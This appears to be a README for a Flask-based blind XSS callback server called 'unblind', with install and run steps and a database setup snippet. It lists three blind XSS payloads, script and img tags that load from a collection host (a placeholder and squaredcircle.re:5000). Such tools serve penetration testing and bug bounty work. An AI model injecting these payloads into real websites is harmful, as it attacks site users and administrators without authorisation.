
First, install dependencies:
```
$ pip3 install Flask
$ pip install Flask-SQLAlchemy
$ pip install flask_login
$ pip install pyopenssl
```

Then, set the environment and start the app:
```
$ export FLASK_APP=project
$ export FLASK_DEBUG=1
$ flask run -h 0.0.0.0 -p 5000
```

The first time you log on, you will need to create a user/password. Choose them well.

Then trigger a Blind XSS with something like:
```
"><script src='http://<ip>:<port>/unblind/xss/unique_str'></script>
"><script src='http://squaredcircle.re:5000/unblind/xss/unique_str'></script>
"><img src='http://squaredcircle.re:5000/unblind/xss/unique_str'/>
```

The tool is not beautiful neither fully functionnal. Need improvements ! Be my guest !

Optional: create the sqlite database:
```
$ python3
>>> from unblind import db, create_app
>>> db.create_all(app=create_app())
```

